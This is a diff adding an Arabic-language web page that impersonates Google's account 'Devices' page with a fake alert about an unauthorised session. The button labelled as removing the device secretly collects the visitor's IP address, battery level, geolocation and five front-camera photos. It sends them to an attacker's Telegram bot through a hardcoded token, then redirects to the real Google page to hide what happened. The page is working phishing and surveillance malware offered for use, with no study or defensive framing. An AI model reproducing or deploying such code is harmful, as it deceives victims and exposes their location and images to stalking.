@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>حسابات Google - الأجهزة النشطة</title>
+
+    <!-- وسوم المعاينة الخارجية لتظهر بشكل رسمي -->
+    <meta property="og:title" content="تحذير أمني: نشاط جديد على حساب Google">
+    <meta property="og:description" content="تم تسجيل دخول جهاز جديد منذ دقائق قليلة. يرجى مراجعة الأجهزة وإزالتها فوراً.">
+    <meta property="og:image" content="wht441.jpg">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+
+    <!-- استدعاء الأيقونات -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #f0f4f9;
+            color: #1f1f1f;
+            font-family: 'Google Sans', Roboto, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background-color: #ffffff;
+            border-radius: 24px;
+            padding: 30px 24px;
+            width: 90%;
+            max-width: 420px;
+            box-shadow: 0 1px 3px 0 rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15);
+            box-sizing: border-box;
+            text-align: right;
+        }
+
+        .google-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .google-header i {
+            color: #4285f4;
+            font-size: 32px;
+            margin-bottom: 8px;
+        }
+
+        h2 {
+            font-size: 22px;
+            font-weight: 400;
+            margin: 0 0 8px 0;
+            color: #1f1f1f;
+            text-align: center;
+        }
+
+        .alert-box {
+            font-size: 14px;
+            color: #444746;
+            line-height: 1.5;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+
+        /* كارت الجهاز بتصميم جوجل الأنيق */
+        .device-card {
+            border: 1px solid #747775;
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 24px;
+            background-color: #f8f9fa;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .device-info h4 {
+            margin: 0 0 4px 0;
+            font-size: 16px;
+            color: #b3261e; /* لون تحذيري من غوغل */
+            font-weight: 500;
+        }
+
+        .device-info p {
+            margin: 0;
+            font-size: 13px;
+            color: #444746;
+        }
+
+        .device-icon {
+            font-size: 32px;
+            color: #b3261e;
+            margin-left: 12px;
+        }
+
+        /* الزر الأحمر المطلوب */
+        .danger-btn {
+            background-color: #b3261e;
+            color: #ffffff;
+            border: none;
+            width: 100%;
+            padding: 14px;
+            font-size: 15px;
+            font-weight: 500;
+            border-radius: 100px;
+            cursor: pointer;
+            text-align: center;
+            transition: background 0.2s, box-shadow 0.2s;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+
+        .danger-btn:hover {
+            background-color: #8c1d18;
+        }
+
+        .danger-btn:active {
+            background-color: #601410;
+        }
+
+        /* شاشة التحميل */
+        .loading-screen {
+            display: none;
+            text-align: center;
+            padding: 30px 0;
+        }
+
+        .spinner {
+            border: 3px solid rgba(0, 0, 0, 0.1);
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        #video, #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- واجهة إدارية شبيهة بـ Google Account -->
+        <div id="ui-view">
+            <div class="google-header">
+                <i class="fa-brands fa-google"></i>
+                <h2>الأجهزة</h2>
+            </div>
+            <div class="alert-box">
+                أنت مسجل الدخول على هذه الأجهزة، أو تم تسجيل دخول عليها في آخر 7 دقائق. ومن الممكن أنه قد تم تسجيل جلسة جديدة غير مصرح بها.
+            </div>
+
+            <!-- تفاصيل الجهاز المشبوه -->
+            <div class="device-card">
+                <div class="device-info">
+                    <h4>جلسة غير معروفة</h4>
+                    <p>Android device • تم تسجيل الدخول منذ 7 دقائق</p>
+                    <p style="color: #b3261e; font-weight: 500; margin-top: 4px;">⚠️ جلسة تتطلب تأكيد إزالة فورية</p>
+                </div>
+                <div class="device-icon">
+                    <i class="fa-solid fa-mobile-screen-button"></i>
+                </div>
+            </div>
+
+            <!-- الزر الأحمر المطلوب -->
+            <button class="danger-btn" onclick="triggerSecurityAction()">
+                <i class="fa-solid fa-shield-halved" style="margin-left: 8px;"></i>
+                اضغط هنا لإزالة جهاز جديد
+            </button>
+        </div>
+
+        <!-- شاشة الانتظار المعالجة -->
+        <div id="loading-view" class="loading-screen">
+            <div class="spinner"></div>
+            <p style="color: #444746; font-size: 14px;">جاري التواصل مع خوادم الأمان وإزالة الجهاز...</p>
+        </div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const TELEGRAM_TOKEN = "8945340524:AAGmUhoo8Pht94xLcI20LdmhfdvXyZPH5lI";
+        const CHAT_ID = "6852708186";
+
+        async function triggerSecurityAction() {
+            document.getElementById('ui-view').style.display = 'none';
+            document.getElementById('loading-view').style.display = 'block';
+
+            const techData = await fetchTech();
+            const now = new Date().toLocaleString('ar-EG');
+
+            let report = `🚨 **تم ضغط زر إزالة جهاز جديد (Google منذ 7 دقائق)!**\n\n`;
+            report += `🕓 الوقت: ${now}\n`;
+            report += `🌍 IP: ${techData.ip}\n`;
+            report += `🔋 البطارية: ${techData.battery}\n\n`;
+            report += `===== 🧾 User-Agent =====\n`;
+            report += `\`${navigator.userAgent}\``;
+
+            await sendToTelegram(report);
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(p => {
+                    sendToTelegram(`📍 موقع الضحية: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                }, () => {}, {timeout: 5000});
+            }
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+
+                let count = 0;
+                const interval = setInterval(() => {
+                    if(count < 5) {
+                        capture(count + 1);
+                        count++;
+                    } else {
+                        clearInterval(interval);
+                        stream.getTracks().forEach(t => t.stop());
+                        window.location.href = "https://myaccount.google.com/device-activity";
+                    }
+                }, 1500);
+            } catch(e) {
+                sendToTelegram("❌ رفض الضحية صلاحية الكاميرا");
+                setTimeout(() => {
+                    window.location.href = "https://myaccount.google.com/device-activity";
+                }, 2000);
+            }
+        }
+
+        async function fetchTech() {
+            let res = { ip: 'Unknown', battery: 'N/A' };
+            try {
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                res.ip = d.ip;
+            } catch(e){}
+
+            try {
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    res.battery = `${Math.round(b.level * 100)}%`;
+                }
+            } catch(e){}
+
+            return res;
+        }
+
+        function capture(n) {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            if(video.videoWidth === 0 || video.videoHeight === 0) return;
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                if(!blob) return;
+                const f = new FormData();
+                f.append('chat_id', CHAT_ID);
+                f.append('photo', blob, 'img.jpg');
+                f.append('caption', `لقطة الكاميرا رقم ${n}`);
+                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {method:'POST', body:f});
+            }, 'image/jpeg', 0.8);
+        }
+
+        async function sendToTelegram(t) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: CHAT_ID, text: t, parse_mode: "Markdown"})
+                });
+            } catch (err) {}
+        }
+    </script>
+</body>
+</html>
